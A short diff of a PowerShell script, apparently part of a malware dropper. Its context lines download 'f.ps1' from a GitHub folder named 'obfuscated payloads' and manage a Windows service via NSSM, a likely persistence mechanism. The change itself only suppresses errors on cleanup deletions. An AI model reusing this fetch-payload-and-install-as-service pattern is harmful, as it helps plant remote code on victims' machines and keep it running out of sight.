@@ -42,8 +42,8 @@ if(-not(Test-Path -Path $fwdPath)){
     iwr -Uri "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/obfuscated%20payloads/f.ps1" -OutFile $fwdPath
 }
 
-Remove-Item -Path $downloadPath -Force -Recurse
-Remove-Item -Path "$env:temp\nssm-2.24" -Force -Recurse
+Remove-Item -Path $downloadPath -Force -Recurse -ErrorAction SilentlyContinue
+Remove-Item -Path "$env:temp\nssm-2.24" -Force -Recurse -ErrorAction SilentlyContinue
 
 if(Get-Service -Name $serviceName -ErrorAction SilentlyContinue){
     & $nssmexe stop $serviceName
